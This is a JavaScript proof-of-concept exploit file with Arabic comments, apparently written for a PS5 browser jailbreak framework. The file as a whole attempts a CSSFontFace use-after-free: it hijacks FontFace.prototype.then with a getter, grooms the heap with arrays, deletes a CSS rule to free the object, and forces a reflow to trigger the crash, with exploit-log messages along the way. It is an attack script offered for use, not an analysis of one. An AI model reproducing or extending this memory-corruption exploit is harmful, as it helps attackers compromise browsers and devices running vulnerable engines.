// inject.js - مخصص لبيئة عمل PS5 Framework المرفقة

function ssa(msg) {
    // دالة التسجيل المدمجة في الإطار المرفوع لعرض النتائج على الشاشة
    const win = document.getElementById('log-window');
    if (win) {
        const line = document.createElement('div');
        line.innerHTML = "<span style='color: #00d9ff;'>[Exploit Log]</span> " + msg;
        win.appendChild(line);
        win.scrollTop = win.scrollHeight;
    }
}

async function runCSSFontFaceUAF() {
    ssa("[*] بدء اختبار ثغرة CSSFontFace UAF...");

    // 1. إعداد الذاكرة المبدئي
    let allocationSize = 200;
    let memoryGroomer = new Array(allocationSize);
    
    // 2. إنشاء قاعدة الخط المستهدفة للتحرير
    let fontA = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
    document.fonts.add(fontA);
    void fontA.loaded;

    let triggered = false;

    // 3. حقن الـ Getter في الـ prototype لاعتراض التدفق البرمجي
    Object.defineProperty(FontFace.prototype, 'then', {
        configurable: true,
        get() {
            if (!triggered && this === fontA) {
                triggered = true;
                ssa("[!] تم اعتراض دالة then بنجاح (Reentrancy Window active).");

                // تنفيذ الـ Heap Grooming تكتيكياً خارج الـ Gigacage
                // نقوم بإنشاء كائنات مصفوفات عادية لمحاولة احتلال حجم الكائن المحرر
                for (let i = 0; i < allocationSize; i++) {
                    memoryGroomer[i] = { butterfly: [1.1, 2.2, 3.3, 4.4] };
                }

                // حذف القاعدة الحاسم لتحرير الكائن
                try {
                    document.getElementById('s').sheet.deleteRule(0);
                    ssa("[+] تم حذف قاعدة الـ CSS بنجاح (Object Freed).");
                } catch(e) {
                    ssa("[-] فشل حذف القاعدة: " + e.message);
                }

                // إجبار المحرك على إعادة الحساب فوراً لمعالجة التحرير
                document.body.offsetTop;
                ssa("[*] تم فرض Layout Reflow عبر offsetTop.");
            }
            return undefined;
        }
    });

    // 4. إثارة الـ Race Condition عبر تحميل خط يجمع بين الـ JS وقاعدة الـ CSS
    try {
        document.fonts.load('1em x', 'AB');
        ssa("[*] تم استدعاء document.fonts.load، يرجى مراقبة الانهيار (Crash)...");
    } catch (err) {
        ssa("[!] حدث استثناء أثناء التحميل: " + err.message);
    }
}

// تشغيل الثغرة عند الضغط على زر GO في الإطار
document.getElementById('exec-btn').addEventListener('click', function() {
    // التأكد من وجود عنصر الـ style المطلوبة للثغرة
    if (!document.getElementById('s')) {
        let styleElement = document.createElement('style');
        styleElement.id = 's';
        styleElement.innerHTML = "@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }";
        document.head.appendChild(styleElement);
    }
    runCSSFontFaceUAF();
});
